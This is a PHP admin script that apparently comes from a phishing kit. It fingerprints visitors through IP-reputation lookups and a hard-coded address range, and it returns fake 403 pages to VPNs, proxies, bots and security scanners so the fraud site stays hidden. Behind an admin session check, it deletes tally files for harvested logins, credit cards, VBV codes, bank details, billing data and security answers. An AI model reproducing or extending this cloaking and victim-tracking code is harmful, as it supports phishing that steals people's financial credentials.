<?php
error_reporting(0);
session_start();
require '../main.php';
$url = "https://blackbox.ipinfo.app/lookup/".$ip;
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if($result == "Y") {
            tulis_file("block_bot.txt","BLOCKED VPN/PROXY || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
            tulis_file("result/total_bot.txt","$ip|VPN/Proxy");
            header('HTTP/1.0 403 Forbidden');
            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            exit();
        }
        $range_start = ip2long("146.112.0.0");
        $range_end   = ip2long("146.112.255.255");
        $ip2long       = ip2long($_SERVER['REMOTE_ADDR']);
        if ($ip2long >= $range_start && $ip2long <= $range_end) {
            header('HTTP/1.0 403 Forbidden');
            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            exit();
        }

        if (scamalytics_api($ip) != "Pass") {
            tulis_file("block_bot.txt","BLOCKED BOT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
              tulis_file("result/total_bot.txt","$ip|VPN/Proxy");
              header('HTTP/1.0 403 Forbidden');
              die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
              exit();
          }
    if($block_referrer == "on") {
    require_once '../crawlerdetect.php';
}

if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
unlink("../result/total_click.txt");
unlink("../result/total_login.txt");
unlink("../result/total_cc.txt");
unlink("../result/total_vbv.txt");
unlink("../result/total_bank.txt");
unlink("../result/total_bot.txt");
unlink("../result/total_upload.txt");
unlink("../result/total_secq.txt");
unlink("../result/total_email.txt");
unlink("../result/total_billing.txt");
unlink("../result/total_bin.txt");
unlink("../result/log_visitor.txt");
echo "<script type='text/javascript'>window.top.location='index.php';</script>";